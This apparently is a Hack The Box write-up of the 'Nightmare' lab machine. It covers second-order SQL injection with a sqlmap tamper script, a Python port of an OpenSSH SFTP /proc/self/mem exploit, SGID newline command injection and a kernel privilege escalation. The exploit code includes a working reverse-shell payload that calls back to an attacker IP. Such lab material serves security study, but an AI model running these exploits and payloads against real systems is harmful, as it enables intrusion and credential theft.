---
icon: tornado
cover: ../../../../.gitbook/assets/Screenshot 2026-03-02 121809.png
coverY: -12.171062373219657
---

# HTB-NIGHTMARE

### Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

#### Port Scanning

```
┌──(sn0x㉿sn0x)-[~/HTB/Nightmare]
└─$ rustscan -a 10.10.10.66 blah blah 
```

```
Open 10.10.10.66:80
Open 10.10.10.66:2222

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: NOTES
2222/tcp open  ssh     (protocol 2.0)
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-OpenSSH 32bit (not so recent ver)
| ssh-hostkey:
|   1024 e2:71:84:5d:ed:07:89:98:68:8b:6e:78:da:84:4c:b5 (DSA)
|   2048 bd:1c:11:9a:5b:15:d2:f6:28:76:c3:40:7c:80:6d:ec (RSA)
```

Two ports. Port 80 is Apache serving a notes application. Port 2222 is SSH, but the version string immediately tells us something important — `SSH-2.0-OpenSSH 32bit (not so recent ver)`. That's not an nmap inference, it's literally what the server sends as its banner. The `32bit` tag means the SSH daemon is a 32-bit binary even if the underlying OS is 64-bit, and "not so recent ver" is the creator's way of signalling a known vulnerability exists here.

Connecting directly to 2222 to confirm the banner:

```
┌──(sn0x㉿sn0x)-[~/HTB/Nightmare]
└─$ nc 10.10.10.66 2222
SSH-2.0-OpenSSH 32bit (not so recent ver)
```

***

### Web Enumeration — TCP 80

Visiting the site presents a login form for a notes application. Standard SQL injection tests at the login and registration pages return nothing interesting — no errors, no behavioural differences. However, the registration page accepts arbitrary usernames without complaint.

The key observation comes after registering an account and logging in — if the username contains a single quote `'`, the notes page returns an SQL error. The injection point isn't at login, it's at whatever query runs after authentication to fetch the user's notes. This is a second-order SQL injection: malicious input is stored at registration and then executed unsafely later when the application queries for that user's data.

***

### Second-Order SQL Injection

#### How It Works

In a standard SQLi, input goes directly into a query and the result is immediate. In a second-order SQLi, the input is stored to the database at one point (registration) and later retrieved and used unsafely in a different query (the notes fetch after login). The storage step sanitizes nothing, and the retrieval step trusts the stored value as safe because "it came from our own database."

The injection triggers at the notes display page, not at login. That means we register a malicious username, log in with it, and the username gets embedded into the notes query without escaping.

#### Manual Verification

Registering with `') OR 1=1 LIMIT 1 #` as the username and logging in returns the admin user's notes — confirming UNION-based injection is viable and that the query returns two columns.

#### Automation Script

Registering and logging in manually for every probe is tedious. A simple script handles the cycle:

```python
from requests import Session
import BeautifulSoup

def register(s, user, passw):
    s.post("http://10.10.10.66/register.php",
           data={"user": user, "pass": passw, "register": "Register"})

def login(s, user, passw):
    x = s.post("http://10.10.10.66/index.php",
                data={"user": user, "pass": passw, "login": "Login"})
    soup = BeautifulSoup.BeautifulSoup(x.text)
    print soup.findAll("div", attrs={'class': 'notes'})

while True:
    sess = Session()
    username = raw_input("Username:")
    register(sess, username, username)
    login(sess, username, username)
```

#### Database Enumeration

Enumerating tables across all databases:

```
Username: ') UNION SELECT table_name, table_schema FROM information_schema.columns #
```

```
[u'notes', u'notes']
[u'users', u'notes']
[u'configs', u'sysadmin']
[u'users', u'sysadmin']
```

Two databases worth investigating: `notes` (the app's own data) and `sysadmin` (sounds far more interesting).

Enumerating columns:

```
Username: ') UNION SELECT table_name, column_name FROM information_schema.columns #
```

```
[u'notes', u'id']
[u'notes', u'user']
[u'notes', u'title']
[u'notes', u'text']
[u'users', u'id']
[u'users', u'username']
[u'users', u'password']
[u'configs', u'server']
[u'configs', u'ip']
```

Dumping `sysadmin.users`:

```
Username: ') UNION SELECT username, password from sysadmin.users #
```

```
[u'admin', u'nimda']
[u'cisco', u'cisco123']
[u'adminstrator', u'Pyuhs738?183*hjO!']
[u'josh', u'tontochilegge']
[u'system', u'manager']
[u'root', u'HasdruBal78']
[u'decoder', u'HackerNumberOne!']
[u'ftpuser', u'@whereyougo?']
[u'sys', u'change_on_install']
[u'superuser', u'passw0rd']
[u'user', u'odiolafeta']
```

Eleven plaintext credentials. The username `ftpuser` with the password `@whereyougo?` is the one that will matter next, both for the obvious naming convention and because SFTP is a restricted mode of SSH.

#### Bonus: SQLMap via Tamper Script

SQLMap can't handle this injection out of the box because the injection happens at registration (where there's no output) and the results appear later at `/notes.php` after authenticating. Getting SQLMap to work requires two pieces:

**Tamper script (`nightmare-tamper.py`)** — called before every SQLMap query, registers a new account with the payload as the username and returns the resulting `PHPSESSID` cookie so the subsequent login request can authenticate with it:

```python
#!/usr/bin/env python

import re
import requests
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def create_account(payload):
    s = requests.Session()
    post_data = {'user': payload, 'pass': 'df', 'register': 'Register'}
    response = s.post("http://10.10.10.66/register.php", data=post_data)
    php_cookie = re.search('PHPSESSID=(.*?);', response.headers['Set-Cookie']).group(1)
    return "PHPSESSID={0}".format(php_cookie)

def tamper(payload, **kwargs):
    headers = kwargs.get("headers", {})
    headers["Cookie"] = create_account(payload)
    return payload
```

**Login request file (`login.request`)** — saved from Burp with no pre-existing `PHPSESSID` cookie and the same password (`df`) as the tamper script uses at registration. SQLMap will POST this to log in, then visit `/notes.php` to check for output:

```
POST /index.php HTTP/1.1
Host: 10.10.10.66
Content-Type: application/x-www-form-urlencoded

user=aaaabcddddd&pass=df&login=Login
```

**SQLMap command** tying it together:

```
┌──(sn0x㉿sn0x)-[~/HTB/Nightmare]
└─$ sqlmap --technique=U -r login.request --dbms mysql \
    --tamper tamper-nightmare.py \
    --second-order 'http://10.10.10.66/notes.php' \
    -p user --no-cast --dump -D sysadmin
```

The `--second-order` flag tells SQLMap to visit `/notes.php` after each login attempt to look for reflected output. When prompted whether to follow the 302 redirect from the initial connection test, answer `n` — we don't need to follow it because SQLMap is already handling the second-order visit explicitly. When asked whether to merge server cookies with ours, answer `n` — we need our tamper script's `PHPSESSID` to persist across all three requests per probe (register → login → notes), and merging would let the login response overwrite it.

SQLMap confirms the injection, identifies MySQL, and dumps the same credential table we found manually.

***

### SFTP Exploit — Shell as ftpuser

#### Credential Testing

Testing every dumped credential pair against port 2222. Most either fail or present an error. `ftpuser:@whereyougo?` authenticates but drops immediately into a restricted shell state — the SSH session closes to a command prompt but any attempt to run commands fails. Testing SFTP directly works:

```
┌──(sn0x㉿sn0x)-[~/HTB/Nightmare]
└─$ sftp -P 2222 ftpuser@10.10.10.66
ftpuser@10.10.10.66's password: @whereyougo?
Connected to 10.10.10.66.
sftp>
```

We have SFTP access, which means we can read arbitrary files from the filesystem — including `/proc/self/maps` and `/proc/self/mem`.

#### Identifying the Architecture

The OS is 64-bit confirmed by downloading and checking `/sbin/init`:

```
┌──(sn0x㉿sn0x)-[~/HTB/Nightmare]
└─$ file init
init: ELF 64-bit LSB shared object, x86-64
```

But the SFTP binary itself is 32-bit. This matters because every known public exploit for this class of vulnerability targets 64-bit. Confirming via `/proc/self/maps` — the address ranges are small and 32-bit, not the wide 64-bit address space. Downloading the `sshd` binary directly from its non-standard path (finding it by checking any accessible `sshd_config`):

```
sftp> get /usr/local2/sbin/sshd
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Nightmare]
└─$ file sshd
sshd: ELF 32-bit LSB shared object, Intel 80386
```

#### The /proc/self/mem Attack

The vulnerability class here is the same mechanism as CVE-2012-0056 (mempodipper). OpenSSH ≤6.6's SFTP subsystem allows writing to `/proc/self/mem`, which directly represents the virtual memory of the running process. The attack sequence:

1. Read `/proc/self/maps` to find the stack address range and the base address of `libc`.
2. Download the remote `libc` binary and resolve the offset of `system()`.
3. Calculate `system()`'s runtime address as `libc_base + system_offset`.
4. Find a `ret` gadget inside libc to fill the stack with, overwriting EIP.
5. Build a new stack: command string at the top, `ret` sled through the middle, ROP chain at the bottom.
6. Write the new stack into `/proc/self/mem` at the stack start address.
7. The process executes the `ret` sled until it hits the ROP chain, which calls `system(payload)`.

#### Porting to 32-bit

The public `openssh-sftp-sploit` targets 64-bit. The calling convention difference between 32-bit and 64-bit is the key change needed:

In 64-bit, function arguments go into registers (`RDI`, `RSI`, etc.), so calling `system(stack_start)` requires: `pop rdi; ret → stack_start_addr → system@libc`.

In 32-bit, function arguments are passed on the stack, so the layout becomes: `system@libc → dummy_return_addr → stack_start_addr`.

Beyond the calling convention, every `long long` becomes `int`, every `%Lx` format specifier becomes `%x`, and `sftp_seek64` becomes `sftp_seek`.

Key diff of changes to the C exploit:

```diff
-  long long start_addr, end_addr, offset;
+  int start_addr, end_addr, offset;

-  long long stack_start_addr = 0, stack_end_addr;
+  int stack_start_addr = 0, stack_end_addr;

-  if (sscanf(p, "%Lx-%Lx %*4c %Lx", &start_addr, &end_addr, &offset) != 3)
+  if (sscanf(p, "%x-%x %*4c %x", &start_addr, &end_addr, &offset) != 3)

-  if (sscanf(p, "%Lx-%Lx ", &stack_start_addr, &stack_end_addr) != 2)
+  if (sscanf(p, "%x-%x ", &stack_start_addr, &stack_end_addr) != 2)

-  long long *se = (void*)(new_stack + stack_len);
-  se[-3] = gadget_address;   // 64-bit: pop rdi gadget
-  se[-2] = stack_start_addr; // 64-bit: argument in register via gadget
-  se[-1] = remote_system_addr;
+  int *se = (void*)(new_stack + stack_len);
+  se[-2] = gadget_address;      // 32-bit: dummy return after system()
+  se[-1] = stack_start_addr;    // 32-bit: argument on stack
+  se[-3] = remote_system_addr;  // 32-bit: system() address first

-  rc = sftp_seek64(mem, stack_start_addr);
+  rc = sftp_seek(mem, stack_start_addr);
```

#### Python Port

A Python version of the same exploit is cleaner for the 32-bit/64-bit toggle and uses pwntools for ROP chain construction:

```python
"""
/proc/self/mem SFTP exploit for OpenSSH <= 6.6
Supports i386 and amd64
"""

from pwn import *
import paramiko

context.arch = 'i386'   # 32-bit target

host = "10.10.10.66"
port = 2222
username = "ftpuser"
password = "@whereyougo?"

lhost = "10.10.14.24"
lport = 443
payload = ("python -c 'import socket,subprocess,os;"
           "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
           "s.connect((\"{0}\",{1}));"
           "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
           "p=subprocess.call([\"/bin/sh\",\"-i\"]);'").format(lhost, lport) + "\x00"

transport = paramiko.Transport((host, port))
transport.connect(username=username, password=password)
sftp = paramiko.SFTPClient.from_transport(transport)

# Read remote memory map
sftp.get('/proc/self/maps', '/tmp/maps')
with open('/tmp/maps') as f:
    maps = f.read()

for line in maps.split('\n'):
    if 'r-xp' in line and '/libc-' in line:
        libc_range, libc_path = line.split(' ')[0], line.split(' ')[-1].strip()
        libc_start, libc_end = [int(x, 16) for x in libc_range.split('-')]
    elif '[stack]' in line:
        stack_start, stack_end = [int(x, 16) for x in line.split(' ')[0].split('-')]
        stack_length = stack_end - stack_start

# Download libc and resolve symbols
sftp.get(libc_path, '/tmp/libc')
libc_elf = ELF('/tmp/libc')

system  = libc_start + libc_elf.symbols[b'system']
exit_fn = libc_start + libc_elf.symbols[b'exit']

log.info("system() at {0}".format(hex(system)))
log.info("stack: {0}-{1}".format(hex(stack_start), hex(stack_end)))

# Build ROP chain for 32-bit: system -> exit -> &payload_string
if context.arch == 'i386':
    ropchain = flat(system, exit_fn, stack_start)
elif context.arch == 'amd64':
    pop_rdi = libc_start + next(libc_elf.search(b'\x5f\xc3'))
    ropchain = flat(pop_rdi, stack_start, system, exit_fn)

ret_address = libc_start + next(libc_elf.search(b'\xc3'))  # single ret gadget

new_stack = fit({
    0: payload,
    (stack_length - len(ropchain)): ropchain
}, filler=pack(ret_address), length=stack_length)

# Write the new stack into /proc/self/mem
with sftp.open('/proc/self/mem', 'w+') as f:
    f.seek(stack_start, f.SEEK_SET)
    f.write(payload)

    f.seek(stack_end - len(ropchain), f.SEEK_SET)
    f.write(ropchain)

    stack_pointer = stack_length
    while stack_pointer > 0:
        stack_pointer -= 32000
        f.seek(stack_start + stack_pointer, f.SEEK_SET)
        f.write(new_stack[stack_pointer:])
```

Running it with a listener ready:

```
┌──(sn0x㉿sn0x)-[~/HTB/Nightmare]
└─$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.10.66
$ id
uid=1002(ftpuser) gid=1002(ftpuser) groups=1001(decoder),1002(ftpuser)
```

Shell as `ftpuser`.

***

### Privilege Escalation — ftpuser to decoder group

#### SGID Binary Discovery

Running standard enumeration for SGID binaries:

```
ftpuser@nightmare:/$ find / -perm -g+s -type f 2>/dev/null
-rwxr-sr-x 1 root decoder 9016 Feb 18  2016 /usr/bin/sls
[...snip other standard binaries...]
```

`/usr/bin/sls` is owned by root, with the `decoder` group as the effective group. Running it produces a directory listing — it appears to be a wrapper around `ls`. The group ownership means executing it elevates our effective group ID to `decoder`, which is precisely what we need.

#### Binary Analysis with Radare2

Running `ltrace` locally against the downloaded binary reveals the filtering logic:

```
strstr(" /", "$(")       = nil
strchr(" /", '\n')       = nil
strchr("|`&><'\"\\[]{};", ' ')  = nil
strchr("|`&><'\"\\[]{};", '/') = nil
system("/bin/ls /")
```

It filters the input against a blacklist of shell metacharacters: `$(`, newlines, and the set `|`, `` ` ``, `&`, `>`, `<`, `'`, `"`, `\`, `[`, `]`, `{`, `}`, `;`. After passing validation, it passes the string directly to `system()` — so command injection is the goal, we just need a character not in the blacklist.

Opening in radare2 for deeper analysis:

```
┌──(sn0x㉿sn0x)-[~/HTB/Nightmare]
└─$ r2 -A /usr/bin/sls
[0x00400610]> s main
[0x00400766]> VV
```

Tracing through the graph view, there's a branch that checks for the `-b` flag. It verifies the first character is `-`, the second is `b`, and the third is a space. If all three match, it sets a flag (`local_2fh = 1`) and continues.

Later in the code, there's a check for `\n` (ASCII `0xa`) using `strchr`. The logic is:

```
if '\n' in input:
    if -b flag is set:
        continue execution
    else:
        exit
else:
    continue execution
```

The `-b` flag bypasses the newline check specifically. Everything else in the blacklist is still checked, but newlines are allowed through with `-b`. A newline in the input string creates a second shell command that `system()` will execute.

#### Exploiting the Command Injection

The `$'\n'` syntax in bash produces a literal newline character, which is what we need to inject. We need a proper bash TTY first — the ftpuser shell is a `/bin/sh` reverse shell without a TTY, so we upgrade it before exploiting:

```
$ python -c 'import pty; pty.spawn("/bin/bash")'
ftpuser@nightmare:/$ /usr/bin/sls -b $'\n/bin/sh'
bin   home  lib32  media  root  sys   vmlinuz
boot  initrd.img ...
$ id
uid=1002(ftpuser) gid=1002(ftpuser) egid=1001(decoder) groups=1001(decoder),1002(ftpuser)
```

The `egid=1001(decoder)` confirms we're now running with the `decoder` effective group ID. We can read `decoder`'s files and write to directories owned by that group.

***

### Privilege Escalation — decoder group to root

#### Enumeration

Decoder's home directory:

```
$ ls -la /home/decoder
drwxr-xr-x  3 root    decoder 4096 Sep 28  2017 .
-r--r-----+ 1 decoder decoder   33 Sep 12  2017 user.txt
drwx-wx--x  2 root    decoder 4096 Apr 14 10:58 test
```

The `test` directory is owned by root but writable by the `decoder` group — we can put files there. `user.txt` is readable by the `decoder` group, so we can grab it now.

#### Kernel Exploit — CVE-2017-1000112

Checking the kernel version:

```
$ uname -a
Linux nightmare 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 GNU/Linux
```

Kernel 4.8.0-58 is vulnerable to CVE-2017-1000112, a UFO (UDP Fragmentation Offload) memory corruption vulnerability that allows local privilege escalation to root. Public exploits exist for this exact kernel version.

Compiling the exploit on our machine and transferring it — but running it immediately fails with a version check error. The exploit uses `lsb_release` to fingerprint the system and select the correct kernel offsets from a hardcoded table. Checking what `lsb_release` actually returns on the target:

```
$ lsb_release -a
Distributor ID: s390x
Description:    s390x GNU/Linux
Release:        0.1
Codename:       bladerunner
```

The box creator has changed the codename from `xenial` to `bladerunner` to break automated exploitation. The fix is a single line change in the exploit source — the offsets for `4.8.0-58-generic` are already correct, we just need the codename to match:

```diff
- { "xenial",      "4.8.0-58-generic", 0xa5d20, 0xa6110, ... },
+ { "bladerunner", "4.8.0-58-generic", 0xa5d20, 0xa6110, ... },
```

Recompile and transfer the fixed binary to `/home/decoder/test/` using our decoder group shell.

#### Ownership Caveat

There's an important subtlety: running the exploit from the SGID `sls` shell fails. The reason comes from Linux's `/proc` security model — when a process's "dumpable" attribute is not 1 (which happens when a process changes its effective UID/GID via SUID/SGID), the kernel changes ownership of all `/proc/[pid]/*` entries to `root:root`. The CVE-2017-1000112 exploit needs to access its own `/proc/self/` files, which it can't do when they're all owned by root due to the SGID elevation.

The solution: use the elevated decoder-group shell to write the exploit to `/home/decoder/test/`, but drop back to the regular `ftpuser` shell (without the SGID elevation) to actually run it. In that shell, `/proc/self/` entries are owned by `ftpuser` and accessible.

```
ftpuser@nightmare:/$ /home/decoder/test/expl
bash: cannot set terminal process group (26896): Inappropriate ioctl for device
bash: no job control in this shell
root@nightmare:/# id
uid=0(root) gid=0(root) groups=0(root)
```

```
root@nightmare:/# cat /root/root.txt
[root flag]
```

***

### Attack Flow

```
[Port 80 - Notes Application]
        |
        v
Second-order SQL injection via username field
  register: malicious username stored in DB
  login + visit notes page: username injected into notes query
        |
        v
UNION-based extraction of sysadmin.users table
  --> 11 plaintext credentials recovered
        |
        v
ftpuser:@whereyougo? --> SFTP access on port 2222
        |
        v
OpenSSH <= 6.6 SFTP + /proc/self/mem write
  --> 32-bit daemon on 64-bit host
  --> port 64-bit exploit to 32-bit (int types, 32-bit calling convention)
  --> read /proc/self/maps: libc base + stack range
  --> download libc, resolve system() offset
  --> build new stack: payload → ret sled → ROP chain (system(stack_start))
  --> write new stack to /proc/self/mem
        |
        v
[Reverse shell as ftpuser]
        |
        v
SGID binary /usr/bin/sls (root:decoder)
  --> ltrace reveals blacklist filtering + -b flag bypass
  --> radare2 confirms: -b allows \n through the newline check
  --> /usr/bin/sls -b $'\n/bin/sh'
        |
        v
[Shell with egid=decoder]
        |
        v
Write access to /home/decoder/test/ (decoder group writable)
        |
        v
Kernel 4.8.0-58 --> CVE-2017-1000112 (UFO memory corruption LPE)
  --> lsb_release codename changed to 'bladerunner' (anti-automation)
  --> single-line fix: update codename in exploit source
  --> compile, transfer to /home/decoder/test/
  --> run from un-elevated ftpuser shell (SGID elevation breaks /proc/self ownership)
        |
        v
[Shell as root]
```

***

### Techniques

| Technique                                 | Where Used                                                                                               |
| ----------------------------------------- | -------------------------------------------------------------------------------------------------------- |
| Second-order SQL injection                | Username field stored at registration, executed unsafely in notes query post-login                       |
| UNION-based SQL injection                 | Extracting `sysadmin.users`, `information_schema` table/column names                                     |
| SQLMap tamper script (`--tamper`)         | Automating multi-step register → login → second-order check cycle                                        |
| SQLMap `--second-order` flag              | Directing SQLMap to visit `/notes.php` for injection output after each login                             |
| SFTP arbitrary file read                  | Reading `/proc/self/maps` and downloading remote `libc` via SFTP protocol                                |
| `/proc/self/mem` write primitive          | Writing a new stack image directly into process virtual memory                                           |
| 32-bit exploit porting                    | Changing `long long` → `int`, `%Lx` → `%x`, 64-bit register calling convention → 32-bit stack convention |
| ROP chain for ret2system                  | `ret` sled through stack → `system(stack_start)` via ROP (both i386 and amd64 variants)                  |
| `ltrace` for dynamic analysis             | Revealing `sls` blacklist filtering logic without disassembly                                            |
| Radare2 graph view (`VV`)                 | Tracing `sls` control flow to find the `-b` flag bypasses the newline check                              |
| SGID binary command injection             | Injecting newline via `$'\n'` with `-b` flag into `sls` → `system()` call                                |
| CVE-2017-1000112 (UFO LPE)                | Local kernel privilege escalation on Ubuntu 4.8.0-58                                                     |
| Exploit fingerprinting bypass             | Changing hardcoded `lsb_release` codename in exploit source from `xenial` to `bladerunner`               |
| `/proc/self` dumpable attribute awareness | Running kernel exploit from un-elevated shell to preserve `/proc/self/` file ownership                   |

<figure><img src="../../../../.gitbook/assets/complete (37).gif" alt=""><figcaption></figcaption></figure>
